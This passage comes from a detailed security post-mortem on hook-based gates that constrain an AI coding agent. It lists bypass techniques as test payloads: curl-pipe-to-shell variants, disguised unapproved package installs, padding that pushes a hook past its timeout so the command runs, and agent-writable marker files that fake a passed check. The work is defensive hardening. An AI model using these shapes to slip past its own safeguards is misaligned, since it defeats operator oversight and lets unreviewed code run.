gate — one word, through a `Bash` call that no gate blocked. And verifying the
marker's *contents* is no better: **whatever the gate can compute, the agent can
compute too.** There is no cryptographic asymmetry available here; the agent runs
with the same privileges as the hook. The only correct answer is to re-run the real
check. v2.6.0 has no marker.

**P2-6 — a `PostToolUse` hook that mutated the tree. EXECUTED** (body diff).

```
v2.5.0:  ( true ) >/dev/null 2>&1 || echo "format reported issues" >&2   # the FORMAT command
         ( true ) 2>&1 | tail -20 >&2 || true                            # then lint
v2.6.0:  ( true ) 2>&1 | tail -20 >&2 || true                            # lint only
```

It invoked the configured `format` command — not `format --check` — after **every**
`Write|Edit`, with no file-type filter, reformatting files the agent never touched,
project-wide. Because it was also `async`, its output might never reach the model.

> **A `PostToolUse` hook must not mutate the working tree behind the operator's
> back: it makes the agent's diff and the operator's diff disagree.** In an agentic
> loop that is worse than cosmetic — the agent reasons about a tree state that no
> longer exists, and review shows changes no one authored.

**P2-7 — a counter keyed on an environment variable the runtime never sets.
EXECUTED.**

The hook derived its session id from `CLAUDE_SESSION_ID`. **Claude Code does not
export it** — the session id arrives in the stdin payload as `.session_id`. Every
session therefore shared one file, `.drift-state-default`, which never reset. It was
observed **at 274 against a threshold of 50**: the tier-1 notice fired on every tool
call, forever. And because `PostToolUse` stderr on exit 0 is not surfaced, it was
simultaneously permanent noise *and* invisible. A headline feature carrying no
signal, in both directions at once.

> **Generalizes to:** verify that the runtime actually provides every input your
> control reads, by printing it, once, from inside the deployed hook. An absent
> environment variable is an empty string, an empty string is a valid-looking
> default, and a valid-looking default is a control that runs forever against the
> wrong scope. This is the cheapest possible check and it was never run.

**P2-8 — a warning behind an always-false guard. EXECUTED.**

`spec-gate-entry`'s only output was guarded by `[ ! -s "$INDEX" ]`, but `INDEX.md`
is *always emitted non-empty* (595 bytes on a fresh install), so the condition could
never be true.

```
v2.5.0  rc=0  <SILENT — gate never fires>
v2.6.0  rc=0  No active spec detected. Consider /spec-new before writing.
```

Dead code that never fired once, in the shipped default configuration, undetectable
by any test that checks emitted bytes.

---

## 4. Cross-cutting patterns — the part to keep

Fourteen defects, eleven recurring shapes — five from the v2.5.0 → v2.6.0 delta
and six added post-tag (§4.6 from P0-3d; §4.7 from W-1; §4.8 and §4.9 from the
five issues filed against 2.6.1; §4.10 from the four `dependency-gate` install
bypasses fixed after v2.7.0 — issues #36, #40, #39, #41; §4.11 from the X-51 /
X-52 cost class, merged as `053a367` — which contribute classes the delta
contains no member of). **The defect count is the v2.5.0 →
v2.6.0 delta's and does not move when a post-tag shape is added.** If this
document is read for one section, this is it.

### 4.1 The agent's write primitive is an unprivileged input channel into privileged code

P0-1 (RCE via drift state) and P2-5 (marker file) are the same bug wearing different
clothes. Both trusted a file the agent could write. Both were gitignored, which made
them feel like internal implementation detail rather than an attack surface.

**Rule:** enumerate every file a hook reads. For each, ask *can the agent write
this?* If yes, it is untrusted input and must be validated at the boundary — and if
it is being used as *evidence that a check passed*, it cannot be, because the agent
can manufacture the same evidence. Re-run the check.

### 4.2 Silence is the default failure mode, and it is indistinguishable from success

Seven of fourteen were silent allows — P0-2, P0-3a, P0-3b, P0-3c, P1-1, P1-3, P2-5.
The suite was green over every one. Two more (P2-7, P2-8) were silent *non*-fires:
controls present, enumerated in the docs, that never once executed their decision.

**Rule:** for every control, write the payload that **must** be denied and the
payload that **must** be allowed, and assert both exit codes against the *deployed*
artifact. This is the single highest-value control in this document. `exit 0` from a
gate must never be reachable by any path other than "I evaluated this and it is
fine."

### 4.3 A control that is not proven to fire has not been shipped

Three gates could not block (two async, one dead guard). A fourth blocked
everything. All four were present, correct-looking, and enumerated in the
documentation as active protections.

**Rule:** **"Prove the gate can fire at all"** is a shipping criterion, not a test
nicety. Presence in the config is not enforcement; enforcement is an observed
rejection.

### 4.4 Precision and enforcement ship together, or the control is deleted

P1-2 (blocks all 60 files), P1-3 (fires on prose, blocked the reviewer's own tool
call), P1-4 (`git commit` in a comment triggers a build), P2-4 (`my.envelope.gleam`
hard-blocked mid-plan). Each trains the operator that the gate is noise.

**Rule:** measure false positives on *real* traffic before turning enforcement on,
and fix precision first. The upstream report's insistence on P1-3/P1-4 before P1-1
is the correct sequencing instinct, and it should be the default.

### 4.5 Disclosure accuracy is a security property

`secrets.md` told operators their paths were blocked while a shell call walked past.
`audio_enabled=true` advertised a capability with no implementation. `cost.jsonl`
recorded no cost. The normative document recommended `async: true` for a blocking
gate. `drift_tier3_enforced=true` describes enforcement the emitted stub does not
implement. Today, `dependency-gate`'s refusal still tells the operator to edit
`deps.md` — a file whose contents are **baked into the hook at emission time**, so
editing it changes nothing until the installer is re-run.

**Rule:** an operator who reads your documentation and acts on it must not end up
with a false belief about what protects them. When implementation and documentation
diverge, **both are defects**. This is why the v2.6.0 release review treated a stale
sentence in a checklist as a shipping blocker: §6.D is normative, so an AI author
conforming to a wrong item writes a wrong gate — and it looks like conformance.

### 4.6 A dependency check must test the dependency, not its name `[+2026-07-31]`

P0-3d. `command -v jq` was used to decide whether JSON could be parsed. It cannot
answer that. It answers *"is there a file of that name on PATH"*, and the two
questions diverge for every shape that actually occurs in the field: a
version-manager shim for an uninstalled runtime, a broken dynamic link, a
non-executable file, a different tool with the same name.

The shape is general, and it is attractive because the cheap check is *almost*
the right one. **All five rows EXECUTED 2026-07-31** (bash 5, Python 3.14.6,
docker 29.6.1) — the evidence is in the note under the table:

| the cheap check | what it actually asserts | what the caller needed |
|---|---|---|
| `command -v X` | a name resolves *(even to a non-executable file)* | X runs and does its job |
| `which X` | a name resolves **and** carries the exec bit | X runs and does its job |
| `[ -x path ]` | a bit is set | exec succeeds |
| `importlib.util.find_spec` | a module is importable-by-name | import has no side-effect failure |
| `docker --version` | a client exists | a daemon is reachable |
| config key is present | the key exists | the value resolves to something usable |

**The evidence, so no row here is taken on trust. `[+2026-07-31]`**

```
command -v / which  a file named jq, chmod 644, alone on PATH:
                    `command -v jq` -> rc=0 (reports it);  `which jq` -> "no jq".
                    The two disagree on exactly the shape §0 note 4(iii) uses.
[ -x path ]         TRUE for a script with an unresolvable shebang, for a
                    DIRECTORY, and for a non-ELF file with the bit set.
                    Executing each: rc=126 in all three.
find_spec           a package whose __init__.py raises RuntimeError -> find_spec
                    returns a spec; `import` then raises. Same for a module
                    importing an absent dependency.
docker --version    DOCKER_HOST=unix:///nonexistent/docker.sock ->
                    `docker --version` rc=0, `docker info` rc=1, `docker ps` rc=1.
config key present  definitional; STATIC, not executed.
```

**Rule:** probe the capability, not the name — for a parser, parse a known
literal and compare. Where a probe is genuinely too expensive, then at minimum
make the *use* fall back on **failure**, not only on absence, and never let
`|| true` erase the difference between "returned nothing" and "could not run."
Those two must not be the same value, because one is an answer and the other is
the absence of one.

**Corollary for tests, which is where this hid.** A substrate built by *removing*
a dependency tests absence only. Present-and-broken is a different substrate and
needs its own — see the recipes in §0 note 4. Whenever a control has a
degradation path, ask what the *set* of ways to degrade is, and be suspicious of
any answer with one element.

### 4.7 Two safe features can compose into an unsafe one, and nobody owns the pair `[+2026-07-31]`

W-1 (issue #29). **Not part of the v2.5.0 → v2.6.0 delta this document was
compiled from** — it was reported against 2.6.1 and is recorded here because the
class is new, not because the count moved. The delta above remains fourteen
defects.

Two features, each correct in isolation, each reviewed in isolation:

- **Worktree isolation.** `isolation: worktree` gives the implementer subagent
  its own checkout. Correct, and the documented drift-prevention mechanism.
- **The command contract.** The gate runs the operator's configured command
  **bare** — no `cd`, no `$CLAUDE_PROJECT_DIR`. Also correct: that is precisely
  what lets a plain `pytest -q` inherit the hook's cwd and follow the agent into
  its worktree.

Compose them under a containerized dev environment and the pair fails open.
`docker compose exec -T app pytest` enters a container whose bind mount points
at the main checkout, so cwd is irrelevant — the gate compiles and tests the
main tree while the agent works in `.claude/worktrees/<n>/`. **The gate passes.
The code it approved was never built.** Same shape for `kubectl exec`, `ssh`,
`vagrant ssh`, devcontainer CLIs. (`docker run -v "$(pwd)":/app` follows cwd and
is fine — it is the *fixed* mount that breaks it.)

Reach is wider than P0-3d, which needed a broken `jq`. This needs only a
container, which the protocol's own Phase 2 invited with no caveat: one `docker`
mention in a 352 KB protocol document, at line 924, saying only "don't wrap it
in an MCP."

**Why no review caught it.** Every technique in §5 examines *a* control. This is
a property of a **pair**, and the pair had no owner: the worktree text lived in
Phase 6.5/7, the command text in Phase 2, and no document referenced the other.
A per-feature review is structurally blind to it — both features pass their own
review, because both are individually right.

| the safe-in-isolation claim | what the pair actually does |
|---|---|
| "worktrees isolate the agent's edits" | isolates the *directory*; not a command that ignores directories |
| "the gate runs your real command" | runs it wherever *its* transport lands, not where the agent worked |
| "parallel tasks can't collide" | true — and the verification of each is pointed at neither |

**Rule:** for any two features that touch the same execution, write down the
requirement each places on the other, in a place both are read from — or make
one of them refuse to switch on when the other's precondition is unstated. W-1's
fix does the latter: `commands.execute_in_cwd` names the precondition, and
`isolation: worktree` is emitted only when it holds.

**Corollary — the honest one.** Config-level derivation closes the *path into*
the fail-open; it does not *detect* the fail-open. An operator who answers the
question wrong is back where they started. The mechanical check that would have
caught this without anyone reasoning about mounts is a gate that compares its own
`pwd` against the tree it was invoked for and says so. That is not built
(backlog W-1c), and saying "we asked the operator" is not the same as saying
"we verified it."

**Second corollary — trading a silent failure for a loud one is a legitimate
fix.** Dropping the isolation costs parallelism and is *visible* when it bites:
two implementers in one tree collide where someone can see it. Keeping it costs
a green gate on uncompiled code and is *silent*. When both options are bad,
prefer the one that announces itself — and pay the cost explicitly rather than
declaring it (here: `max_concurrent_tasks` drops to 1 in the emitted queue
config, with the reason in-file, instead of a doc note nobody reads).

### 4.8 A normative instruction and its enforcement can contradict each other, and per-half tests will not notice `[+2026-07-31]`

X-30 (issue #30). Not a delta member; recorded for the class.

The protocol **instructs the agent**, in two normative places, to write four
fields — timestamp, escalation reason, what it was about to do, what input it
needs — into `.claude/sessions/.decision-pending-<session-id>`. The protocol's
**own emitted hook** ran, on every fire:

```sh
: >"$P" 2>/dev/null || true
```

An unconditional truncate. **A conforming agent and a conforming hook could not
both be right.** Measured on a real install: all eight `.decision-pending-*`
files were 0 bytes.

The consequence is not tidiness. The file is the operator's only record of *why*
an unattended overnight run stopped, and the protocol builds on it explicitly —
*"the operator returns to a halted loop with the decision-pending file **ready
for action**."* Ready for action was a zero-byte file: a filename, and nothing
else, at exactly the moment the halt exists to deliver the reason.

**Why every test passed.** Each half was correct *against itself*. The hook's
tests asserted it fires, exits 0, sweeps stale sentinels, and namespaces by
session — all true. The doc's reviewers checked the instruction was clear — it
was. Nothing tested the *pair*, because a pair has no owner: the instruction
lives in the doc-emission phase, the truncate in the hook body, and neither
file mentions the other.

| what was verified | what nobody verified |
|---|---|
| the hook fires and exits 0 | that what the agent wrote is still there afterward |
| the instruction is unambiguous | that anything honors it |
| the sentinel is swept after 7 days | that it carries a payload before then |

**Rule:** for every artifact one component *writes* and another *manages*, write
down which component owns its **contents** — separately from who owns its
existence and its lifecycle. Then test the round trip: write the documented
payload, run the manager, assert the payload survives. Here existence (the alarm
cue) and mtime (the 7-day sweep) were genuinely load-bearing; contents were
not read by anything, so the truncate looked free. It was free to the *code* and
expensive to the *operator*, which is a cost no code-level test measures.

**Corollary — "it looks deliberate" is not a reading, it is a guess.** The
truncate sat between `mkdir -p` and a `find -mtime +7 -delete`, so it read as
latch-or-lifecycle machinery. The issue said so, and honestly flagged the
inference as unverified. Settling it took one question with a checkable answer:
*does anything read this file's contents, or key on its emptiness?* Nothing did
— so the truncate was collateral, the hook was the wrong half to keep, and the
documented contract could stand. Ask what **reads** the thing before deciding
what may destroy it.

### 4.9 Relaxing a deny-list control is a security change — and sometimes the honest outcome is that it cannot be done `[+2026-07-31, revised 2026-08-03]`

X-31 and X-32 (issues #31, #32). The most transferable lesson in this document,
and the one it cost the most to learn. **Read the ending first: after four
rounds the relaxations were REMOVED, not shipped.**

Both issues were **usability** reports, filed responsibly, each erring in the
safe direction:

- `secrets-gate` refused `rg -g '!*.pem'` — a **negated** glob that *excludes*
  the protected path. It refused a command that reads strictly fewer files than
  the bare `rg` it allowed.
- `dependency-gate` refused `curl … | python3 -c '<script>'` — where `-c`
  supplies the program and the fetched bytes are **data on stdin**. `curl … |
  python3` with no program argument is genuine RCE and must keep blocking.

Both are real defects. Both have clean workarounds the issues name themselves.
And implementing either exemption means **widening a deny-list control**, which
is a security change no matter how it was filed.

**What four rounds of trying looked like.** Each round closed every finding on
its list, declared success, and was proved wrong by the next adversarial pass:

| round | blocking fail-opens found | representative |
|---|---|---|
| 1 | 4 | sticky arm exempts a run of tokens; command-agnostic arm |
| 2 | 6 | `rg -g '\!*.pem'` — a backslash makes it a **positive** glob |
| 3 | 12 | `python3 -m code` — `-m` names a module, and `code` is a stdin REPL |
| 4 (architectural) | ~20 | `node -p`; a trailing `#` comment; a subshell |

Round 4 was not another patch pass. It went after the *primitives* — routing
both walks through the shared command-position model, canonicalizing the write
set into paths, widening the writer set, fixing the tokenizer. It was the right
diagnosis and it still did not converge, because the exemption's precondition is
**"parse this shell command the way bash and then ripgrep/CPython will"**, and a
gate that must answer that question exactly has taken on an adversary's whole
grammar.

**The decision, and the shape worth copying.** The relaxations were removed; the
**deny-direction hardening from the same rounds was kept.** That split is the
point: those rounds were not wasted. Measured against a pristine v2.6.1 install,
the hardening closed five pre-existing fail-opens that had nothing to do with the
exemptions —

```
curl … 2>&1 | sh        2.6.1 ALLOW -> DENY
curl … |<newline>sh     2.6.1 ALLOW -> DENY
curl … | \sh            2.6.1 ALLOW -> DENY
curl … | 'sh'           2.6.1 ALLOW -> DENY
curl … | ${SHELL}       2.6.1 ALLOW -> DENY
```

— while the three the exemptions had opened (`node -p`, trailing comment,
subshell) went away with them. **Net: strictly stronger than before, and the
issues answered by a refusal message that names the workaround**, which is what
both issues actually asked for in their Impact sections.

**Rule:** before widening a control, decide what you will do if it does not
converge, and set a round budget. A widening that needs the attacker's full
grammar is not a patch, it is a parser — price it that way. When the budget is
spent, the honest fix for an over-refusal is often a **better refusal**: it
costs nothing, cannot fail open, and addresses the actual complaint, which is
usually that the operator could not tell what to do next.

**Corollary 1 — a wrong pin is worse than no pin.** One under-block was asserted
as *correct* in four suites at once. A green suite was actively defending the
defect, and repairing it **required editing the pins**. A test written from the
same misunderstanding as the code does not catch the code; it ratifies it. When
a fix and its tests are authored together from one premise, the premise is what
needs review — not the diff.

**Corollary 2 — ambiguity the substrates cannot resolve identically goes
fail-closed.** The shell tokenizer genuinely cannot separate `rg -g \!*.pem`
(shell eats the backslash → negation) from `rg -g '\!*.pem'` (backslash survives
→ positive glob); both arrive identical. Where one substrate has information the
other cannot get, the tempting move is to discard it for parity. Discard it
*toward deny*. Parity bought by throwing away the safer substrate's knowledge is
parity at the permissive bound.

**Corollary 3 — comments that claim completeness are load-bearing and were
false.** *"EVERY redirect spelling"* and *"EVERY file a stage downstream of the
downloader writes"* were both written in good faith and both wrong (`>|` was
eaten by the stage splitter; `dd of=` and `sponge` were not writers to the code).
A future reader trusts a comment like that instead of re-deriving the set, so an
overclaiming comment is a defect with a delayed fuse. Enumerate what is covered,
or say "these three shapes" and record the rest as residue.

**Corollary 4 — measure a security change against the previous release, not
against your own last commit.** The question that ended this episode was not
"did we close our findings" — every round could say yes — but *"is there any
payload the last release denied that we now allow?"* That diff is cheap
(`git worktree add` the tag, install both, run one corpus through both), it is
unarguable, and it should gate any change to a control. Adopted here as a
release criterion.

**Corollary 5 — a normalization that is sound for a deny list is unsound for
the allow list sitting next to it.** The hardening above is mostly one
primitive: a *fold* that deletes decoration (`\`+newline, a trailing
backslash, `$'`/`$"`) before anything matches. Folding is sound for a deny
list — it can only make more spellings reach a forbidden name, which is where
`curl … | sh$''` and `cat important.pem$''` were closed. It is **unsound for
an allow list**, and this harness holds two: the dotenv **template**
carve-out and the approved-package list. Folded, `cat .env.example$''` and
`pip install requests$''` collided with the exempt name and were allowed —
**66 payloads that a pristine v2.6.1 denies** (50 in `secrets-gate`, 16 in
`dependency-gate`), found only by sweeping every decoration against a 2.6.1
install rather than by reading the diff. The same sweep over the three
Bash gates that hold **no** allow list — `test-gate`, `spec-gate-commit`,
`ci-mirror` — moved nothing, which is the evidence that the allow list, not
the fold, is the thing to look for. The
"strictly stronger" claim above is false without the repair, and nothing in
the round's own test suite noticed, because every test was written about the
deny direction the fold was added for.

The repair is one rule, and its shape is the transferable part: **a gate that
consults an allow list judges both spellings — the folded one and the one the
operator typed — and refuses if either refuses.** The unfolded pass feeds the
walk exactly the string the previous release fed it, so its verdict *is* the
previous release's verdict, and the union is a superset of the old denies **by
construction**. The alternative — a per-decoration adjacency test kept in sync
with the normalizer — is the same "reproduce the grammar" trap this section
exists to warn about, one layer down. Cost is nothing on the commands that
dominate: the second spelling is empty whenever the fold changed nothing.

One payload survives the repair and is worth naming rather than rounding away:
`cp '.env.example ;` — an unbalanced quote resolving to an allow-listed
template. Its fold happens *inside the tokenizer*, below the spelling split, so
the two-pass rule never sees it. It is bounded (bash refuses to parse the
command at all; the previous release allows the same string without the
trailing `;`; the deny-list side is unaffected) and it is left open
deliberately, because special-casing it ahead of the allow list is the
treadmill this section is about.

**Rule:** when you add a canonicalization in front of a matcher, enumerate
every ALLOW decision downstream of it. Each one is a hole the canonicalization
just widened, and the direction of the bug is the opposite of the direction you
were working in.

### 4.10 A verdict can be correct for the wrong reason, and a verdict-only differential is blind to it `[+2026-08-04]`

**EXECUTED, with one deviation from §0 stated up front.** §0 defines EXECUTED
as "reproduced against both tags", and this section cannot honour that: the
defects it describes were introduced and fixed *between* releases, so its
figures come from intermediate commits. Those are now named, because a label
nobody can reproduce is decoration:

| build | commit | what it is |
|---|---|---|
| v2.7.0 | `bf3a303` | the release these defects shipped in or against |
| pre-fix | `0d932b7` | PR #43 merged — the regression and the cubic scan live |
| current | `main` | after PR #45 |

Several figures below were first reported by an adversarial review and are
labelled only after reproduction here, because "a finding that has not been
executed has not been found" applies to a *number* as much as to a defect. The strongest control this project has is §7's release diff: run
one corpus through both substrates of the old and new release and require the
*previously denied, now allowed* set to be empty. It is cheap and unarguable,
and it did not see this:

```
sudo pip install evil npx        rc=0   ALLOWS an unapproved install
sudo pip install evil npx more   rc=2   denies — naming `more`, not `evil`
```

Both releases returned **2** for the second command, so the differential
recorded it as *unchanged* and moved on. The gate was not evaluating that
command correctly in either release; it was reaching the right exit code by
inspecting the wrong token. One spelling away sat a live fail-open that the
corpus contained, ran, and could not perceive — because it compared verdicts
and the defect lived in the *reason*.

The mechanism is worth keeping separately, because it generalises past this
codebase. The matcher was a regex anchored at command position, and the scanner
sliced its arguments out of the matched span:

> **Matching and extraction are two different questions, and a regex answers
> only the first.** "Does an install invocation exist here" is safe under a
> greedy, unbounded prefix — the engine backtracks until some parse succeeds.
> "*Where does it start*" is not: POSIX ERE returns the leftmost-**longest**
> parse, so an unbounded prefix run could swallow `pip install evil` and let
> the anchor match a trailing `npx`. `BASH_REMATCH[0]` / `m.end()` then covered
> the whole segment, the argument list came back empty, and an install verb
> with no arguments is a lockfile restore.

The module's own docstring asserted that unbounded consumption "cannot fail
open here — the engine backtracks". That sentence is true of matching and
silently false of the slice taken from it, and it is the reason the defect
survived several reviews: it read as a proof that this class could not exist.

**Rule, two parts.** A differential over a deny-list control compares the
**reason**, not only the verdict — for a refusal, the token or class named in
the message is part of the observation. And wherever a matcher's *span* is used
to locate anything (arguments, offsets, a remainder), the choice of parse is a
second decision that needs its own argument; if what you mean is "the first
invocation", ask for it directly rather than hoping the longest match is it.

**Corollary 1 — "the previously-denied-now-allowed set is EMPTY" is a claim
about the CORPUS, not about the control.** **EXECUTED.** `[+2026-08-04]` The fix for the
above was itself released with that sentence in its freeze-exception, and the
sentence was *true*: the set was empty, of a corpus that did not happen to
contain `pythont3`. A follow-up pass found the same fix had turned
`curl u | pythont3 -c 'x' ; sh a.sh` from deny to **allow on both substrates**,
because the reduction it added stripped the ABI tags in any position while the
regex admitted them only after the digits. Two spellings of one question, again
— the exact defect that fix was written to end, relocated rather than removed.

Pair the release diff with a **spelling sweep around whatever the change
touched**: enumerate the neighbourhood of the thing you just taught the matcher
about (here, every interleaving of the version and tag characters) and run
*that* through both builds. An empty regression set over a corpus assembled
before the change cannot see a class the change invented.

**Corollary 2 — a control's own COST is a fail-open, and the timeout table is
part of the control.** **EXECUTED.** `[+2026-08-04]` The same fix replaced one anchor match
with a per-token scan. The anchor embedded a nested `(flag|positional)*`, and on
a `WRAPPER NAME=VALUE …` line an assignment is consumable by two different arms,
so a single *failing* match was already quadratic and the scan made it cubic. An
ordinary `env A0=0 … A399=399 make test` went from 0.064 s to 8.6 s; a 7 KB line
took **~66 s** inside an async hook callback — steady state over repeated
runs; a cold first run measured 69.6 s. An earlier revision of this entry
said 67 s, and a later one replaced it with 69.1 s as though that were a
correction. It was not: the spread is run-to-run variance of a few
percent, and the original figure was already right. **Re-measuring a
number does not entitle you to a new decimal** — if the second reading
does not distinguish a different claim, say the same number.

No parse was wrong. The gate simply did not answer, while the *other* substrate
denied the same command in about a second. That is the forbidden direction
reached by exhaustion.

**[Settled 2026-08-13, X-51.]** This paragraph used to add that the gate "had no
entry in either timeout table — so what a hang becomes was left to a default
nobody had chosen." **That question is closed, and the answer is the bad one.** A
`PreToolUse` hook cancelled at its declared `timeout` is killed and exits
124/137/143; only exit **2** blocks; so the call **PROCEEDS**. A crossing is not
an over-denial — it is the gate being **skipped**. Leaving the question open is
not free: it let three later rounds size cost caps against the wrong harm. The
mechanism, and what to do instead, are in §4.11.

**Rule:** measure a matcher's worst case on adversary-shaped input, not just its
verdicts — `WRAPPER` plus a long run of assignments is the shape to try first
against any anchored command-position regex. "How long may this take" is a
security parameter: a control that can be made not to answer has an allow arm
whether or not anyone wrote one.

**[Corrected 2026-08-13, X-51/X-52.]** This rule used to prescribe that "every
blocking control needs an explicit timeout with an explicit posture." **Declaring
a timeout is not the fix and cannot be.** The posture of a runtime-imposed
timeout is fixed at ALLOW and the control cannot override it, so the declared
value is the *attacker's budget*, not the defender's safety net — raising it only
moves the crossing and costs interactive latency on every call. A team can
satisfy the old wording by writing `timeout: 60` and be exactly as bypassable,
which is the state that shipped a live bypass in this repo. The two postures that
actually work are in §4.11.

**Corollary 3 — an optimisation's safety argument is not the same as the
optimisation being safe.** **EXECUTED.** `[+2026-08-04]` The guard that fixed Corollary 2
skipped the match at tokens that could not complete the pattern, and was
documented as harmless because the caller kept an unguarded fallback. The
fallback ran only when the guard found **no** match — it said nothing about the
guard finding a **later** one, which is precisely what a missing table entry
causes: a longer head, an emptied argument list, and a lockfile-restore reading.
Measured on 84 payloads before it shipped.

**Rule, and it took one more round to get right.** The first fix was an
equivalence test: drive the fast and slow paths over a real corpus, require
identical results. **That test then passed over the next fail-open** — a
brace-glued spelling the corpus did not contain, because a corpus only holds
spellings someone already listed. What works is asserting the fast path's
**precondition as a property**, over a vocabulary that spans the dimension it
keys on: *every* match must end on a token the guard would have stopped at.
Then **mutation-test the constant, not just the code** — shrinking the
character set the guard keys on passed 1902 of 1902 checks while a live
fail-open sat behind it, which is how the gap was found at all.

So: an equivalence test is the floor, not the ceiling. Prefer a census over an
equality assertion, and prove the census bites by breaking the thing it
guards.

### 4.11 A gate that is correct but slow is a bypass `[+2026-08-13]`

**EXECUTED.** Filed as X-51 and X-52 (both `done`); X-54 and X-55 remain `open`
and fail-open. Merged as `053a367`.

This is a corollary of §4.10 in name only. §4.10 is about a verdict that is right
for the wrong reason; this is about a verdict that is right and **never
arrives**. It has its own mechanism, its own detection failure, and its own fix
discipline, and conflating the two is what let a live bypass ship here.

**The mechanism, verified live rather than inferred.** Crossing the declared
`timeout` means the harness **cancels** the hook. A cancelled process exits
124/137/143 — never 2. Only exit **2** blocks a `PreToolUse` call. So the deny
never arrives and the call proceeds. The test that settles it: a hook that sleeps
past a declared `timeout: 2` and would then `exit 2` is killed and the command
runs (canary written); the identical hook allowed to finish blocks it (no
canary).

`FAIL_CLOSED=1` does not rescue this. It governs what the hook does on **its
own** error and says nothing about the harness killing it from outside. An `ERR`
trap does not fire either, for the same reason — the process is killed, it does
not fail.

**The headline corollary: the declared timeout is the attacker's budget, not the
defender's safety net.** Its posture is fixed at ALLOW and your control cannot
override it. Raising it moves the crossing and costs interactive latency on every
call. Only two postures actually work:

1. **Deny cheaply *before* the expensive work.** Order the gate so the common
   deny is reached in O(1), and only then do anything proportional to input.
2. **Be provably fast on every admissible input** — which means a bound you have
   measured on adversary-shaped input, not on a corpus.

**The concrete chain.** `pip install evilpkg` is denied by the dependency gate in
0.02 s. Prepend 128 KB of quote-dense padding and the gate still *reaches* rc=2 —
at **59.97 s** — but under its own emitted `timeout: 60` it is killed first. The
verdict was always correct. It simply never arrived.

**Cost tracks DENSITY, not length.** At a fixed 8185 B, four densities measured
**5.67 / 2.77 / 1.47 / 0.31 s** — 18x at identical length. Two consequences: a
length cap is not a cost bound, and a before/after cost comparison must hold the
payload *family* fixed. A harness here swapped a `'('`-dense inner for `printf`
filler on the stated ground that cost tracks length; the swap was not
cost-preserving and the numbers it produced did not mean what they said.

**Padding under every declared cap still bypasses.** X-52's shape is 80019 bytes
with **zero** jump targets — inside both shipped caps — and cost 139.58 s. A cap
bounds the dimension it names; cost is a third dimension that neither length nor
delimiter density measures.

**A memo on a security decision is sound only if its key captures everything the
decision depends on.** The fix here memoised the invoker walk per segment. Its
first cut cached a decision taken on the **trailing word** — but a quoted run can
*extend* that word (`s` + `"h"` is `sh`; `sud` + `o` is `sudo`), so the cached
answer was wrong for a longer tail. That was a live dependency-gate bypass:
`{ { { { s"h" -c 'pip install evilpkg'` went main=DENY / tip=ALLOW with bash
actually executing it.

**Why nothing caught it, which is the part to keep.** Verdict tests cannot see
cost. When that bypass was live, this repo's suite was **25 suites / 9668 checks
/ 0 failed** and a **4104-row** shell-vs-SDK differential was green. They were not
weak tests; they answer *"what verdict would this gate reach"*, and the harness
asks a different question — *"does a verdict arrive before the deadline"*. No
suite here applies the emitted `timeout` when it invokes a hook. A corpus is also
structurally unable to help: every row in that differential had a short head and
so never reached the phase where the bypass lived.

**What did work:** constructing shapes from reasoning about which class the guard
structurally cannot serve, rather than extrapolating from an existing payload;
and **source pins** on the cost-critical structure, which fail on the
reintroduced quadratic itself rather than on machine speed. A wall-clock
assertion is the weaker instrument — the margin here would have been 2.6%.

---

## 5. Why detection failed, and what actually worked

**A 1016-check suite was green over all fourteen defects, including the RCE.**
Understanding why is more valuable than the defect list.

**Every suite asserted emission determinism** — *does the installer write the
expected bytes* — and **nothing executed anything.** Byte-level assertions cannot
distinguish a hook that blocks from a byte-identical hook whose `async: true`
elsewhere in `settings.json` makes it inert. They cannot see a `case` fall-through.
They cannot see that `CLAUDE_SESSION_ID` is never set. The tests were not weak; they
were **measuring a different property than the one that mattered**, and they were
written from the same reading of the spec as the implementation, so they inherited
every misunderstanding.

Three instruments gave false assurance and are worth naming as a class:

- **Golden fixtures** — pin bytes, silent on behavior.
- **Frozen-twin byte-equality** — proves two copies agree, not that either is right.
- **Tests written from the implementation** — encode the bug as the expectation.

**What found the defects:** a six-lens adversarial review of a **real install** that
**executed the emitted hooks against crafted payloads**. Static review of the same
files, by the same reviewer, found neither the RCE nor the dead gates.

**What v2.6.0 added:** `tests/test_hook_behavior.py` — pipes crafted payloads into
the emitted hooks and asserts exit codes; **verified to fail before the fixes** (10
failures on pre-fix templates, 0 after). Plus
`tests/test_substrate_differential.py`, which runs one payload corpus through *both*
substrates and fails on divergence. Suite went 1016 → 1828 checks.

> **The rule this yields:** a security control's test must exercise the control's
> *decision*, through the same interface the runtime uses, against the *deployed*
> artifact. And **a regression test for a security fix must be demonstrated to fail
> before the fix** — otherwise you have tested that your test passes.

**What that account left out, now closed. `[+2026-07-31]`** As first written, this
section named `tests/test_hook_behavior.py` as the answer to "why detection
failed" — payloads into the emitted **hooks**, asserting exit codes. True, and it
read broader than it was. The emitted **wrappers** (`auto.sh`, `loop.sh`,
`goal-loop.sh`) are controls too — halt sentinels, eligibility refusal, a claim
protocol — and *nothing had ever executed one*. Three review rounds covered them
by byte assertion. The first round to run them found four defects, including all
three wrappers exiting **0** with a terminal-*success* reason for a run that
dispatched nothing, which under `nohup` or cron is indistinguishable from a clean
overnight run. `tests/test_wrapper_behavior.py` (65 checks, demonstrated to fail
against the pre-fix templates) closes it. Self-reported as backlog O-6, now
`done`.

**And an instrument can quietly stop existing. `[+2026-07-31]`** That new suite
printed `0 passed, 0 failed` and exited **0** on any host without `flock` (stock
macOS ships none), and the runner parsed that into `(0, 0)`, saw exit 0, and
rendered **`ok`**. The 65-check instrument added *because* "a green suite sat on
top of all four defects" could contribute zero while the run still ended with
`ALL SUITES PASSED`. It now emits a `SUITE SKIPPED:` marker carried onto the
table, the totals line, and the closing banner.

> **Rule:** a suite that *declines to run* must be reported distinctly from a
> suite that *ran and passed*. `0 passed, 0 failed` is not a pass, and neither is
> a green banner over a host that could not execute the thing under test.
> Coverage that varies by machine is coverage you do not have — say so on the
> line a human reads, because that is the line that gets quoted into a commit
> message.

### 5.1 The recurrence pattern

Worth recording plainly: **seven consecutive fix commits in this repository each
shipped a defect into the class they were fixing**, and none was caught by the
green suite — every one was caught by the next independent review. The chain is
taken from the repository's own three anchors, not inferred from subject lines:

```
0fba4d2  round-2 — "a fail-open and a false positive the last batch shipped"
fac2897  batch 1 — repair the guards that could not fail
9952741  batch 2a — the quoted-run rule, resolved structurally
edac7c7  batch 2b — one quote-aware segmenter, and the SDK re-synced
ff435f5  batch 3 — eight independent defects
b1782ec  round-3 — "four defects the last batch shipped"
b5d7f71  round-4 — whose own new D12 validator rejected two legitimate
         never_read_paths minutes after it was declared done (f1ed58c)
```

The three anchors, which reconcile exactly: round-3's entry says *"five
